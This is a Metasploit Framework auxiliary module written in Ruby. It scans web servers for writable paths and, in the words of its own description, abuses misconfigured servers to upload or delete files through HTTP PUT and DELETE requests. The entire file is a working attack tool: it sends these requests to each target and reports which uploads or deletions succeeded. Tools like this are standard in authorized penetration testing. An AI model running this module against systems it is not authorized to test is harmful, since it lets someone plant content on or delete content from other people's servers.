##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Scanner::Http::Writable < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Exploit::Remote::HttpClient
	
	# Scanner mixin should be near last
	include Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module can abuse misconfigured web servers to
			upload and delete web content via PUT and DELETE HTTP
			requests.
			},
			'Author'      => [ 'Kashif [at] compulife.com.pk' ],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
					['PUT'],
					['DELETE']
				],
			'DefaultAction' => 	'PUT'		
		)
		
		register_options(
			[
				OptString.new('PATH', [ true,  "The path to attempt to write or delete", '/http_write.txt']),
				OptString.new('DATA', [ false,  "The data to upload into the file", ' '])
			], self.class)
	end

	# Test a single host
	def run_host(ip)

		self.target_port = datastore['RPORT']	

		case action.name
		when 'PUT'
			begin
				res = send_request_cgi({
                	'uri'          =>  datastore['PATH'],
                	'method'       => 'PUT',
					'ctype'        => 'text/plain',
					'data'         => datastore['DATA']
				}, 20)

				return if not res
				if (res and res.code >= 200 and res.code < 300)
					print_status("Upload succeeded on http://#{target_host}:#{target_port}#{datastore['PATH']} [#{res.code}]")
				else
					print_status("Upload failed on http://#{target_host}:#{target_port} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE			
			end
			
		when 'DELETE'
			begin
				res = send_request_cgi({
                	'uri'          => datastore['PATH'],
                	'method'       => 'DELETE'
				}, 10)

				return if not res
				if (res and res.code >= 200 and res.code < 300)
					print_status("Delete succeeded on http://#{target_host}:#{target_port}#{datastore['PATH']} [#{res.code}]")
				else
					print_status("Delete failed on http://#{target_host}:#{target_port} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE			
			end		
		end

	end

end
end
